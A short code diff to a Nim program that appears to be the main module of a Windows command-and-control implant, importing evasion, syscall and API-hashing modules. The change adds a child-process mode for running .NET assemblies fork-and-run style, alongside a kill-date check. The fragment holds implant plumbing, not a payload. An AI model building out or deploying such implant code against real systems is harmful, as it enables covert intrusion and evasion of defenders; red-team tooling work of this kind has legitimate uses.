@@ -7,6 +7,7 @@ import std/[os, times, strutils, random]
 when defined(windows):
   import winim/lean
   import api_hash
+  import dotnet
 import config, transport, commands, evasion, syscalls
 
 # ── DNS canary ────────────────────────────────────────────────────────────────
@@ -39,6 +40,12 @@ proc killDateCheck() =
     except: discard
 
 proc main() =
+  when defined(windows):
+    # Child process mode for DOTNET_EXEC fork-and-run
+    if getEnv("__ENDGAME_CLR_CHILD") == "1":
+      clrChildRun()
+      quit(0)
+
   randomize()
 
   killDateCheck()
